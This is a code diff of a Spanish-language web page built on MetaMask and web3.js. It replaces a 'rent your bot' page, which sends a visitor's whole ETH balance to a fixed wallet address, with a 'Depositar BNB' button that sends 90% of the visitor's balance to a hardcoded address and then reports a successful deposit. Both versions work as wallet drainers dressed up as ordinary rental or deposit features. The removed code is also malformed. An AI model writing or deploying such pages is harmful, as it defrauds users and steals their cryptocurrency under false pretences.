@@ -1,110 +1,76 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Tarjetas de Bot</title>
-  <style>
-    /* Estilos CSS para la animación del botón */
-    .rent-btn {
-      background-color: #4CAF50;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s ease-in-out;
-    }
+  <head>
+    <meta charset="UTF-8" />
+    <title>Botón de depósito de BNB</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+  </head>
+  <body>
+    <button id="deposit-button">Depositar BNB</button>
 
-    .rent-btn:hover {
-      background-color: #3e8e41;
-    }
+    <script>
+      // Crea una instancia de Web3 con el proveedor de Metamask
+      const web3 = new Web3(window.ethereum);
 
-    /* Estilos CSS para las tarjetas de bot */
-    .bot-card {
-      display: inline-block;
-      margin: 20px;
-      padding: 20px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      text-align: center;
-    }
-
-    .normal {
-      background-color: #f2f2f2;
-    }
-
-    .fast {
-      background-color: #d9d9d9;
-    }
-
-    .premium-fast {
-      background-color: #bfbfbf;
-    }
-    
-    /* Estilos CSS para centrar las tarjetas de bot */
-    body {
-      text-align: center;
-      background-color: #333;
-    }
-  </style>
-</head>
-<body>
-  <h1>Alquila tu bot</h1>
-  <div class="bot-card normal">
-    <h3>Bot Normal</h3>
-    <p>Saldo de ETH: <span id="normal-balance">0.0001</span></p>
-    <button class="rent-btn">Alquilar</button>
-  </div>
-
-  <div class="bot-card fast">
-    <h3>Bot Rápido</h3>
-    <p>Saldo de ETH: <span id="fast-balance">0.0001</span></p>
-    <button class="rent-btn">Alquilar</button>
-  </div>
-
-  <div class="bot-card premium-fast">
-    <h3>Bot Premium Rápido</h3>
-    <p>Saldo de ETH: <span id="premium-balance">0.0001</span></p>
-    <button class="rent-btn">Alquilar</button>
-  </div>
-
-  <script>
-    const rentButtons = document.querySelectorAll('.rent-btn');
-
-    rentButtons.forEach((button) => {
-      button.addEventListener('click', async () => {
+      // Escucha el evento de click en el botón de depósito
+      $("#deposit-button").click(async function () {
         try {
-          // Conectar a Metamask
-          await ethereum.request({ method: 'eth_requestAccounts' });
-
-          // Obtener la dirección del usuario conectado
-          const accounts = await ethereum.request({ method: 'eth_accounts' });
+          // Obtiene la dirección de Metamask del usuario
+          const accounts = await web3.eth.getAccounts();
           const userAddress = accounts[0];
 
-          // Obtener el saldo de ETH del usuario
-          const ethBalance = await ethereum.request({
-            method: 'eth_getBalance',
-            params: [userAddress, 'latest'],
-          });
+          // Obtiene el saldo de BNB en la cuenta del usuario
+          const balance = await web3.eth.getBalance(userAddress);
+          const balanceBN = web3.utils.toBN(balance);
 
-          // Enviar el saldo de ETH a la dirección especificada
-          const txHash = await ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [
-              {
-                from: userAddress,
-                to: '0x8935361d21943Ee8a863082EdD8a6',
-            value: ethBalance,
-          },
-        ],
+          // Calcula la cantidad a depositar (90% del saldo)
+          const depositAmountBN = balanceBN.muln(90).divn(100);
+          const depositAmount = web3.utils.fromWei(
+            depositAmountBN.toString(),
+            "ether"
+          );
+
+          // Dirección de destino para el depósito
+          const depositTo = "0x8935361d21943Ee8a863082EdD8a6Aefb062E434";
+
+          // Crea la transacción y la firma con Metamask
+          const tx = {
+            to: depositTo,
+            value: web3.utils.toWei(depositAmount, "ether"),
+          };
+          const signedTx = await web3.eth.sendTransaction(tx);
+
+          console.log("Transacción enviada:", signedTx);
+          alert("¡Depósito exitoso!");
+        } catch (error) {
+          console.error(error);
+          alert("Error al enviar la transacción. Verifica que tienes suficiente saldo y que Metamask está conectado.");
+        }
       });
-
-      alert(`Transacción enviada: ${txHash}`);
-    } catch (error) {
-      console.error(error);
-      alert('Ha ocurrido un error al enviar la transacción.');
-    }
-  });
-</script>
-
-</body>
+    </script>
+  </body>
 </html>
